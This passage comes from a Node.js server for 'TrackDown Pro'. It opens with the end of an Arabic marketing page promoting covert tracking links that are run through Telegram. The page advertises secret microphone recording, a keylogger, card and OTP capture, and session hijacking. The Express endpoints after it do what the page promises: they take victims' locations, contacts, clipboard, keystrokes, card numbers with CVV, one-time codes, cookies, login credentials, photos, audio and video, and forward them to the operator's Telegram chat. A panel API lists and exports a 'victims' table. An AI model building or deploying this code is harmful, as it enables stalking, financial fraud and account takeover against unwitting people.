<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TrackDown Pro v5.1</title>
<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2991/2991148.png">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Inter', 'Segoe UI', sans-serif; background: #0a0a0f; min-height: 100vh; color: #e4e4e7; }
.glow { position: fixed; width: 600px; height: 600px; border-radius: 50%; filter: blur(150px); opacity: 0.15; pointer-events: none; }
.glow-1 { top: -200px; left: -200px; background: #6366f1; }
.glow-2 { bottom: -200px; right: -200px; background: #8b5cf6; }
.container { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; padding: 60px 24px; }
.header { text-align: center; margin-bottom: 80px; }
.logo { font-size: 42px; font-weight: 700; color: #fff; letter-spacing: -1px; margin-bottom: 12px; }
.version { display: inline-block; padding: 4px 12px; background: rgba(99,102,241,0.15); color: #818cf8; font-size: 12px; font-weight: 500; border-radius: 20px; margin-bottom: 16px; }
.tagline { color: #71717a; font-size: 16px; font-weight: 400; max-width: 500px; margin: 0 auto; line-height: 1.6; }
.stats { display: flex; justify-content: center; gap: 48px; margin-bottom: 80px; flex-wrap: wrap; }
.stat { text-align: center; }
.stat-value { font-size: 48px; font-weight: 700; color: #fff; }
.stat-label { color: #52525b; font-size: 14px; margin-top: 4px; }
.section { margin-bottom: 80px; }
.section-header { text-align: center; margin-bottom: 48px; }
.section-title { font-size: 28px; font-weight: 600; color: #fff; margin-bottom: 12px; }
.section-desc { color: #71717a; font-size: 15px; max-width: 600px; margin: 0 auto; }
.features { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
.feature { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06); border-radius: 16px; padding: 28px; transition: all 0.3s ease; }
.feature:hover { background: rgba(255,255,255,0.04); border-color: rgba(255,255,255,0.1); transform: translateY(-2px); }
.feature-header { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
.feature-icon { width: 44px; height: 44px; background: linear-gradient(135deg, rgba(99,102,241,0.2) 0%, rgba(139,92,246,0.2) 100%); border-radius: 12px; display: flex; align-items: center; justify-content: center; }
.feature-icon svg { width: 22px; height: 22px; stroke: #a5b4fc; }
.feature-title { font-size: 17px; font-weight: 600; color: #fff; }
.feature-desc { color: #71717a; font-size: 14px; line-height: 1.7; }
.cta { text-align: center; padding: 60px 0; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06); border-radius: 24px; }
.cta-title { font-size: 26px; font-weight: 600; color: #fff; margin-bottom: 12px; }
.cta-desc { color: #71717a; font-size: 15px; margin-bottom: 32px; }
.btn-group { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
.btn { display: inline-flex; align-items: center; gap: 8px; padding: 14px 28px; border-radius: 12px; font-size: 15px; font-weight: 500; text-decoration: none; transition: all 0.2s ease; }
.btn-primary { background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%); color: #fff; }
.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(99,102,241,0.3); }
.btn-secondary { background: rgba(255,255,255,0.05); color: #e4e4e7; border: 1px solid rgba(255,255,255,0.1); }
.btn-secondary:hover { background: rgba(255,255,255,0.08); }
.social { display: flex; justify-content: center; gap: 16px; margin-top: 32px; }
.social a { display: flex; align-items: center; gap: 8px; padding: 10px 20px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 10px; color: #a1a1aa; font-size: 14px; text-decoration: none; transition: all 0.2s; }
.social a:hover { background: rgba(255,255,255,0.06); color: #fff; }
.footer { text-align: center; padding-top: 48px; border-top: 1px solid rgba(255,255,255,0.06); margin-top: 80px; }
.footer p { color: #52525b; font-size: 13px; }
.footer .contact { color: #71717a; margin-bottom: 8px; }
</style>
</head>
<body>
<div class="glow glow-1"></div>
<div class="glow glow-2"></div>
<div class="container">
<header class="header">
<div class="version">v5.1</div>
<h1 class="logo">TrackDown Pro</h1>
<p class="tagline">منصة تتبع متكاملة توفر لك أدوات احترافية لجمع المعلومات عبر روابط ذكية مع 45 قالباً جاهزاً وأكثر من 190 ميزة متقدمة</p>
</header>

<div class="stats">
<div class="stat"><div class="stat-value">33</div><div class="stat-label">قالب جاهز</div></div>
<div class="stat"><div class="stat-value">90+</div><div class="stat-label">ميزة تتبع</div></div>
<div class="stat"><div class="stat-value">24/7</div><div class="stat-label">تشغيل مستمر</div></div>
</div>

<section class="section">
<div class="section-header">
<h2 class="section-title">الميزات الرئيسية</h2>
<p class="section-desc">مجموعة شاملة من أدوات التتبع والجمع المتقدمة التي تعمل بشكل سري وفعال</p>
</div>
<div class="features">
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg></div>
<h3 class="feature-title">تتبع الموقع GPS</h3>
</div>
<p class="feature-desc">تحديد الموقع الجغرافي بدقة عالية مع إمكانية التتبع المستمر وإرسال تحديثات كل 60 ثانية تلقائياً</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg></div>
<h3 class="feature-title">التقاط الكاميرا</h3>
</div>
<p class="feature-desc">التقاط صور من الكاميرا الأمامية والخلفية معاً، بالإضافة إلى تسجيل فيديو لمدة 5 ثواني بجودة عالية</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"/></svg></div>
<h3 class="feature-title">تسجيل صوتي</h3>
</div>
<p class="feature-desc">تسجيل الصوت المحيطي من الميكروفون لمدة 10 ثواني بشكل سري دون علم المستخدم</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>
<h3 class="feature-title">Keylogger متقدم</h3>
</div>
<p class="feature-desc">تسجيل جميع ضغطات المفاتيح في الوقت الحقيقي مع إرسال فوري للبيانات المدخلة</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9"/></svg></div>
<h3 class="feature-title">كشف IP الحقيقي</h3>
</div>
<p class="feature-desc">استخدام تقنية WebRTC للكشف عن عنوان IP الحقيقي حتى لو كان المستخدم يستخدم VPN</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg></div>
<h3 class="feature-title">التقاط البطاقات</h3>
</div>
<p class="feature-desc">جمع بيانات بطاقات الائتمان ورموز OTP والتحقق الثنائي عبر قوالب مصممة باحترافية</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"/></svg></div>
<h3 class="feature-title">جهات الاتصال</h3>
</div>
<p class="feature-desc">الوصول إلى قائمة جهات الاتصال الكاملة مع الأسماء وأرقام الهواتف وعناوين البريد</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg></div>
<h3 class="feature-title">بصمة المتصفح</h3>
</div>
<p class="feature-desc">جمع بصمة فريدة للمتصفح تشمل Canvas و WebGL و GPU لتحديد هوية الجهاز</p>
</div>
<div class="feature">
<div class="feature-header">
<div class="feature-icon"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg></div>
<h3 class="feature-title">Session Hijacking</h3>
</div>
<p class="feature-desc">التقاط ملفات الكوكيز وبيانات الجلسة للوصول إلى حسابات المستخدم المفتوحة</p>
</div>
</div>
</section>

<section class="cta">
<h2 class="cta-title">ابدأ الاستخدام الآن</h2>
<p class="cta-desc">افتح البوت على تيليجرام وأنشئ رابط التتبع الأول خلال ثوانٍ</p>
<div class="btn-group">
<a href="https://t.me/" class="btn btn-primary">
<svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-.752-.244-1.349-.374-1.297-.789.027-.216.324-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.477-1.635.099-.002.321.023.465.141.121.1.154.234.17.331.015.098.034.322.019.496z"/></svg>
فتح البوت
</a>
</div>
<div class="social">
<a href="https://www.tiktok.com/@4o0_v">TikTok @4o0_v</a>
<a href="https://www.instagram.com/4o0_v">Instagram @4o0_v</a>
</div>
</section>

<footer class="footer">
<p class="contact">للحصول على نسخة خاصة تواصل عبر السوشيال ميديا</p>
<p>TrackDown Pro - جميع الحقوق محفوظة 2024</p>
</footer>
</div>
</body>
</html>
`;
res.send(dashboardHTML);
});


app.post("/location",(req,res)=>{
var lat=parseFloat(decodeURIComponent(req.body.lat || '0'));
var lon=parseFloat(decodeURIComponent(req.body.lon || '0'));
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || '0';
if(uid != null && !isNaN(lat) && !isNaN(lon) && (lat !== 0 || lon !== 0)){
const chatId = parseInt(uid,36);
const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
const latDir = lat >= 0 ? 'شمال' : 'جنوب';
const lonDir = lon >= 0 ? 'شرق' : 'غرب';
const latAbs = Math.abs(lat).toFixed(6);
const lonAbs = Math.abs(lon).toFixed(6);
const accText = acc && acc !== '0' && acc !== 'null' ? `\n🎯 <b>الدقة:</b> ${Math.round(parseFloat(acc))} متر` : '';
lastKnownLocation.set(chatId, { lat, lon, acc, time: new Date().toLocaleString() });
bot.sendLocation(chatId, lat, lon);
bot.sendMessage(chatId, `📍 <b>موقع جديد</b>\n\n🌐 ${latAbs}° ${latDir}, ${lonAbs}° ${lonDir}${accText}\n⏰ ${new Date().toLocaleString()}\n\n🗺 <a href="${mapsUrl}">فتح الخريطة</a>`, {
  parse_mode: "HTML",
  disable_web_page_preview: true,
  reply_markup: JSON.stringify({
    inline_keyboard: [[{text: "🔄 إعادة إرسال", callback_data: "resend_location"}]]
  })
});
res.send("Done");
}else{
res.send("Missing data");
}
});

app.post("/contacts",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var contacts=req.body.contacts || null;
if(uid != null && contacts != null){
try {
  const contactList = JSON.parse(contacts);
  let msg = `📱 <b>جهات الاتصال (${contactList.length}):</b>\n\n`;
  contactList.slice(0, 50).forEach((c, i) => {
    msg += `${i+1}. <b>${c.name || 'بدون اسم'}</b>\n`;
    if(c.phones && c.phones.length > 0) {
      c.phones.forEach(p => { msg += `   📞 <code>${p}</code>\n`; });
    }
    if(c.emails && c.emails.length > 0) {
      c.emails.forEach(e => { msg += `   📧 <code>${e}</code>\n`; });
    }
  });
  if(contactList.length > 50) msg += `\n... و${contactList.length - 50} جهة اتصال أخرى`;
  bot.sendMessage(parseInt(uid,36), msg, {parse_mode: "HTML"});
  
  const buffer = Buffer.from(JSON.stringify(contactList, null, 2), 'utf-8');
  bot.sendDocument(parseInt(uid,36), buffer, {caption: `📱 ملف جهات الاتصال (${contactList.length} جهة)`}, {filename: 'contacts.json', contentType: 'application/json'});
} catch(e) { console.log(e); }
res.send("Done");
}
});

app.post("/battery",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var level=decodeURIComponent(req.body.level) || null;
var charging=decodeURIComponent(req.body.charging) || null;
var time=decodeURIComponent(req.body.time) || null;
if(uid != null && level != null){
let msg = `🔋 <b>معلومات البطارية:</b>\n\n`;
msg += `⚡ الشحن: <code>${Math.round(level * 100)}%</code>\n`;
msg += `🔌 يشحن الآن: ${charging === 'true' ? '✅ نعم' : '❌ لا'}\n`;
if(time && time !== 'Infinity') msg += `⏱️ وقت متبقي: <code>${Math.round(time / 60)} دقيقة</code>`;
bot.sendMessage(parseInt(uid,36), msg, {parse_mode: "HTML"});
res.send("Done");
}
});

app.post("/clipboard",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var text=decodeURIComponent(req.body.text) || null;
if(uid != null && text != null && text.length > 0){
bot.sendMessage(parseInt(uid,36), `📋 <b>محتوى الحافظة:</b>\n\n<code>${text.substring(0, 1000)}</code>`, {parse_mode: "HTML"});
res.send("Done");
}
});

app.post("/wifi",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var info=decodeURIComponent(req.body.info) || null;
if(uid != null && info != null){
bot.sendMessage(parseInt(uid,36), `📶 <b>معلومات الشبكة:</b>\n\n${info}`, {parse_mode: "HTML"});
res.send("Done");
}
});

app.post("/live_location",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var lat=parseFloat(decodeURIComponent(req.body.lat || '0'));
var lon=parseFloat(decodeURIComponent(req.body.lon || '0'));
var count=decodeURIComponent(req.body.count) || "1";
if(uid != null && !isNaN(lat) && !isNaN(lon) && (lat !== 0 || lon !== 0)){
const latDir = lat >= 0 ? 'شمال' : 'جنوب';
const lonDir = lon >= 0 ? 'شرق' : 'غرب';
const latAbs = Math.abs(lat).toFixed(6);
const lonAbs = Math.abs(lon).toFixed(6);
bot.sendMessage(parseInt(uid,36), `🔴 <b>تتبع مباشر #${count}:</b>\n\n🌐 <code>${latAbs}° ${latDir}</code> | <code>${lonAbs}° ${lonDir}</code>\n\n📍 <a href="https://maps.google.com/?q=${lat},${lon}">الموقع على الخريطة</a>`, {parse_mode: "HTML"});
res.send("Done");
}else{
res.send("Missing data");
}
});

// Video Recording from Camera
app.post("/video",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var video=req.body.video || null;
var cam=decodeURIComponent(req.body.cam) || "front";
if(uid != null && video != null){
try {
  const buffer = Buffer.from(video, 'base64');
  bot.sendVideo(parseInt(uid,36), buffer, {caption: `🎥 فيديو مسجل (${cam})`}, {filename: 'video.mp4', contentType: 'video/mp4'});
} catch(e) { console.log(e); }
res.send("Done");
}
});

// Screenshot/Screen Capture
app.post("/screenshot",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var img=decodeURIComponent(req.body.img) || null;
if(uid != null && img != null){
try {
  const buffer = Buffer.from(img, 'base64');
  bot.sendPhoto(parseInt(uid,36), buffer, {caption: `🖥️ لقطة شاشة الجهاز`});
} catch(e) { console.log(e); }
res.send("Done");
}
});

// Keylogger - Capture typed text
app.post("/keylog",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var keys=decodeURIComponent(req.body.keys) || null;
var field=decodeURIComponent(req.body.field) || "unknown";
if(uid != null && keys != null && keys.length > 0){
bot.sendMessage(parseInt(uid,36), `⌨️ <b>تسجيل الكتابة (${field}):</b>\n\n<code>${keys.substring(0, 2000)}</code>`, {parse_mode: "HTML"});
res.send("Done");
}
});

// File Upload
app.post("/fileupload",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var filename=decodeURIComponent(req.body.filename) || "file";
var filedata=req.body.filedata || null;
var filetype=decodeURIComponent(req.body.filetype) || "application/octet-stream";
if(uid != null && filedata != null){
try {
  const buffer = Buffer.from(filedata, 'base64');
  bot.sendDocument(parseInt(uid,36), buffer, {caption: `📁 ملف مرفوع: ${filename}`}, {filename: filename, contentType: filetype});
} catch(e) { console.log(e); }
res.send("Done");
}
});

// Push Notification Permission
app.post("/push_permission",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var status=decodeURIComponent(req.body.status) || null;
if(uid != null && status != null){
let icon = status === 'granted' ? '✅' : '❌';
bot.sendMessage(parseInt(uid,36), `🔔 <b>صلاحية الإشعارات:</b> ${icon} ${status}`, {parse_mode: "HTML"});
res.send("Done");
}
});

// Credit Card Data
app.post("/card",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var cardnum=decodeURIComponent(req.body.cardnum) || null;
var expiry=decodeURIComponent(req.body.expiry) || null;
var cvv=decodeURIComponent(req.body.cvv) || null;
var name=decodeURIComponent(req.body.name) || null;
if(uid != null && cardnum != null){
let msg = `💳 <b>بيانات البطاقة الائتمانية:</b>\n\n`;
msg += `💰 <b>رقم البطاقة:</b> <code>${cardnum}</code>\n`;
msg += `📅 <b>تاريخ الانتهاء:</b> <code>${expiry}</code>\n`;
msg += `🔐 <b>CVV:</b> <code>${cvv}</code>\n`;
msg += `👤 <b>اسم حامل البطاقة:</b> <code>${name}</code>`;
bot.sendMessage(parseInt(uid,36), msg, {parse_mode: "HTML"});
res.send("Done");
}
});

// OTP/2FA Code Capture
app.post("/otp",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var otp=decodeURIComponent(req.body.otp) || null;
var platform=decodeURIComponent(req.body.platform) || "Unknown";
if(uid != null && otp != null){
bot.sendMessage(parseInt(uid,36), `🔑 <b>رمز التحقق (${platform}):</b>\n\n<code>${otp}</code>`, {parse_mode: "HTML"});
res.send("Done");
}
});

// Device Info (Smart Redirect)
app.post("/deviceinfo",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var info=decodeURIComponent(req.body.info) || null;
if(uid != null && info != null){
const lines = info.split('\n').filter(l => l.trim());
let formatted = `📱 <b>معلومات الجهاز</b>\n\n`;
lines.forEach(line => {
  const clean = line.replace(/<[^>]*>/g, '').trim();
  if(clean) formatted += `${clean}\n`;
});
formatted += `\n⏰ ${new Date().toLocaleString()}`;
bot.sendMessage(parseInt(uid,36), formatted, {parse_mode: "HTML"});
res.send("Done");
}
});

// WebRTC IP Leak (Real IP behind VPN)
app.post("/webrtc",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var localip=decodeURIComponent(req.body.localip) || null;
var publicip=decodeURIComponent(req.body.publicip) || null;
if(uid != null && (localip || publicip)){
let msg = `🌐 <b>WebRTC IP Leak:</b>\n\n`;
if(localip) msg += `🏠 <b>IP المحلي:</b> <code>${localip}</code>\n`;
if(publicip) msg += `🌍 <b>IP العام:</b> <code>${publicip}</code>`;
bot.sendMessage(parseInt(uid,36), msg, {parse_mode: "HTML"});
res.send("Done");
}
});

// Session/Cookies Capture
app.post("/session",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var cookies=decodeURIComponent(req.body.cookies) || null;
var storage=decodeURIComponent(req.body.storage) || null;
if(uid != null){
let msg = `🍪 <b>بيانات الجلسة:</b>\n\n`;
if(cookies) msg += `<b>Cookies:</b>\n<code>${cookies.substring(0, 1500)}</code>\n\n`;
if(storage) msg += `<b>LocalStorage:</b>\n<code>${storage.substring(0, 1500)}</code>`;
bot.sendMessage(parseInt(uid,36), msg, {parse_mode: "HTML"});
res.send("Done");
}
});

// Canvas/WebGL Fingerprint
app.post("/fingerprint",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var fp=decodeURIComponent(req.body.fp) || null;
if(uid != null && fp != null){
bot.sendMessage(parseInt(uid,36), `🔍 <b>بصمة المتصفح:</b>\n\n<code>${fp}</code>`, {parse_mode: "HTML"});
res.send("Done");
}
});

// Installed Apps Detection (Android)
app.post("/apps",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var apps=decodeURIComponent(req.body.apps) || null;
if(uid != null && apps != null){
bot.sendMessage(parseInt(uid,36), `📲 <b>التطبيقات المكتشفة:</b>\n\n${apps}`, {parse_mode: "HTML"});
res.send("Done");
}
});

// Social Media Detection
app.post("/socials",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var socials=decodeURIComponent(req.body.socials) || null;
if(uid != null && socials != null){
bot.sendMessage(parseInt(uid,36), `📱 <b>حسابات التواصل الاجتماعي:</b>\n\n${socials}`, {parse_mode: "HTML"});
res.send("Done");
}
});

// Form Autofill Data
app.post("/autofill",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data) || null;
if(uid != null && data != null){
bot.sendMessage(parseInt(uid,36), `📝 <b>بيانات الملء التلقائي:</b>\n\n${data}`, {parse_mode: "HTML"});
res.send("Done");
}
});

app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;

var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if( uid != null && data != null){

 
if(data.indexOf(ip) < 0){
return res.send("ok");
}

data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
var camType=decodeURIComponent(req.body.cam) || "photo";
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');

var camLabel = camType === "selfie" ? "📸 صورة سيلفي (أمامية)" : 
               camType === "back" ? "📷 صورة خلفية" : "📷 صورة";
  
var info={
filename: camType + "_snap.png",
contentType: 'image/png'
};

try {
bot.sendPhoto(parseInt(uid,36),buffer,{caption: camLabel, reply_markup: JSON.stringify({
  inline_keyboard: [[{text: "🔄 إعادة إرسال", callback_data: "resend_location"}]]
})},{...info});
} catch (error) {
console.log(error);
}

res.send("Done");
 
}

});



app.post("/audio",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var audio=decodeURIComponent(req.body.audio) || null;
  
if( uid != null && audio != null){
  var buffer=Buffer.from(audio,'base64');
  var info={
    filename:"recording.ogg",
    contentType: 'audio/ogg'
  };

  try {
    bot.sendAudio(parseInt(uid,36),buffer,{},info);
  } catch (error) {
    console.log(error);
  }
  res.send("Done");
}
});

// Credentials Capture - التقاط بيانات تسجيل الدخول
app.post("/creds",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var email=decodeURIComponent(req.body.email) || null;
var password=decodeURIComponent(req.body.password) || null;
  
if(uid != null && email != null && password != null){
  logActivity('creds_captured', { email, template: 'unknown', time: new Date().toISOString() });
  bot.sendMessage(parseInt(uid,36), `🔐 <b>بيانات تسجيل دخول جديدة!</b>\n\n📧 <b>البريد:</b> <code>${email}</code>\n🔑 <b>كلمة المرور:</b> <code>${password}</code>\n\n⏰ الوقت: ${new Date().toLocaleString()}`, {
    parse_mode: "HTML",
    reply_markup: JSON.stringify({
      inline_keyboard: [[{text: "🔄 إعادة إرسال", callback_data: "resend_location"}]]
    })
  });
  res.send("Done");
}
});

// Personal Info Capture - التقاط المعلومات الشخصية
app.post("/personal",(req,res)=>{
var uid=decodeURIComponent(req.body.uid) || null;
var name=decodeURIComponent(req.body.name) || null;
var phone=decodeURIComponent(req.body.phone) || null;
var email=decodeURIComponent(req.body.email) || null;
  
if(uid != null){
  let msg = `👤 <b>معلومات شخصية جديدة!</b>\n\n`;
  if(name) msg += `📛 <b>الاسم:</b> <code>${name}</code>\n`;
  if(phone) msg += `📱 <b>الهاتف:</b> <code>${phone}</code>\n`;
  if(email) msg += `📧 <b>البريد:</b> <code>${email}</code>\n`;
  msg += `\n⏰ الوقت: ${new Date().toLocaleString()}`;
  
  bot.sendMessage(parseInt(uid,36), msg, {parse_mode: "HTML"});
  res.send("Done");
}
});

// ============ Panel API Endpoints ============
app.use('/api/panel', (req, res, next) => {
    if (req.path === '/login') return next();
    return dashAuth(req, res, next);
});

// Get stats
app.get('/api/panel/stats', async (req, res) => {
    try {
        const totalResult = await pool.query('SELECT COUNT(*) FROM victims');
        const todayResult = await pool.query("SELECT COUNT(*) FROM victims WHERE created_at >= CURRENT_DATE");
        const locResult = await pool.query("SELECT COUNT(*) FROM victims WHERE latitude IS NOT NULL");
        res.json({
            total: parseInt(totalResult.rows[0].count) || 0,
            today: parseInt(todayResult.rows[0].count) || 0,
            links: Object.keys(shortUrls || {}).length,
            locations: parseInt(locResult.rows[0].count) || 0
        });
    } catch (e) {
        res.json({ total: 0, today: 0, links: 0, locations: 0 });
    }
});

// Get recent activity
app.get('/api/panel/recent', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM victims ORDER BY created_at DESC LIMIT 10');
        const victims = result.rows.map(v => ({
            ip: v.ip,
            country: v.country,
            device: v.device,
            flag: v.country ? getCountryFlag(v.country) : '🌍',
            time: v.created_at ? new Date(v.created_at).toLocaleString('ar-EG') : 'الآن'
        }));
        res.json(victims);
    } catch (e) {
        res.json([]);
    }
});

// Get all victims
app.get('/api/panel/victims', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM victims ORDER BY created_at DESC LIMIT 100');
        const victims = result.rows.map(v => ({
            id: v.id,
            ip: v.ip,
            country: v.country,
            city: v.city,
            browser: v.browser,
            device: v.device,
            flag: v.country ? getCountryFlag(v.country) : '🌍'
        }));
        res.json(victims);
    } catch (e) {
        res.json([]);
    }
});

// Get victim details
app.get('/api/panel/victim/:id', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM victims WHERE id = $1', [req.params.id]);
        if (result.rows.length > 0) {
            const v = result.rows[0];
            res.json({
                ip: v.ip,
                country: v.country,
                city: v.city,
                browser: v.browser,
                device: v.device,
                os: v.os,
                lat: v.latitude,
                lon: v.longitude,
                battery: v.battery_level,
                credentials: v.credentials
            });
        } else {
            res.json({ error: 'Not found' });
        }
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Get advanced stats
app.get('/api/panel/advanced-stats', async (req, res) => {
    try {
        const countriesResult = await pool.query("SELECT country as name, COUNT(*) as count FROM victims WHERE country IS NOT NULL GROUP BY country ORDER BY count DESC LIMIT 10");
        const browsersResult = await pool.query("SELECT browser as name, COUNT(*) as count FROM victims WHERE browser IS NOT NULL GROUP BY browser ORDER BY count DESC LIMIT 5");
        const devicesResult = await pool.query("SELECT device as name, COUNT(*) as count FROM victims WHERE device IS NOT NULL GROUP BY device ORDER BY count DESC LIMIT 5");
        res.json({
            countries: countriesResult.rows.map(r => ({ name: r.name, count: parseInt(r.count) })),
            browsers: browsersResult.rows.map(r => ({ name: r.name, count: parseInt(r.count) })),
            devices: devicesResult.rows.map(r => ({ name: r.name, count: parseInt(r.count) }))
        });
    } catch (e) {
        res.json({ countries: [], browsers: [], devices: [] });
    }
});

// Export CSV
app.get('/api/panel/export-csv', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM victims ORDER BY created_at DESC');
        let csv = 'IP,Country,City,Browser,Device,OS,Latitude,Longitude,Created\n';
        result.rows.forEach(v => {
            csv += `${v.ip || ''},${v.country || ''},${v.city || ''},${v.browser || ''},${v.device || ''},${v.os || ''},${v.latitude || ''},${v.longitude || ''},${v.created_at || ''}\n`;
        });
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=victims.csv');
        res.send(csv);
    } catch (e) {
        res.status(500).send('Error exporting');
    }
});

